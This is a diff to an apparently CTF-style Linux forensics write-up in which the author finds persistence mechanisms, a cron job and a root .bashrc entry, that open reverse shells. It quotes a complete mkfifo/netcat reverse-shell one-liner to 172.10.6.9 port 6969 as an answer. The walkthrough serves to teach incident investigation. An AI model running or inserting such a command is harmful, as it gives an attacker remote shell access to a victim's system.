@@ -82,7 +82,7 @@ To see the scheduled tasks on a Linux system, we can run `crontab -l`:
 
 ![crontab -l](/assets/img/uploads/crontab-l.png "crontab -l")
 
-We see one job scheduled, and it's attempting to create a reverse shell to the same address and port as before. How "persistent."
+We see one job scheduled, and it's attempting to create a reverse shell to the same address and port as before.
 
 **Answer:** /usr/bin/rm /tmp/f;/usr/bin/mkfifo /tmp/f;/usr/bin/cat /tmp/f|/bin/sh -i 2>&1|/usr/bin/nc 172.10.6.9 6969 >/tmp/f
 
@@ -120,4 +120,10 @@ How did that happen? I didn't even do anything -- I just logged as root, and it 
 
 ##### Can you find out how the suspicious command has been implemented?
 
-To figure out this situation, we revisit our friend .bashrc, but for the root account this time:
+To figure out this situation, we revisit our friend .bashrc, but for the root account this time
+
+![](/assets/img/uploads/bashrc-root.png)
+
+and we find our culprit: yet another reverse shell.  Our malicious friend sure is persistent.
+
+**Answer:**
